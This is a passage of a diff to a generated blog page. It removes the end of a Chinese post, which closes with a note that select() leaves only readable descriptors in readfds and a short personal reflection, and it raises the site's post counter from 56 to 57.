-<p>要特别注意一次select操作后readfs中只剩下了当前可读的fd.所以每次要复制一个副本穿进去.</p>
-</blockquote>
-<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>还是认真学习认真思考能让人不那么丧…..庆幸自己找到了自己真正的兴趣所在.<br>不要让一些没意义的东西麻痹了自己. 要时刻提醒自己生存不易.<br>不高兴了就更更博,耐心看看技术书,让自己静一静.闲了就容易生事.<br>keep on moving!!!</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3127,7 +2881,7 @@ int main(void)
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">56</span>
+                    <span class="site-state-item-count">57</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
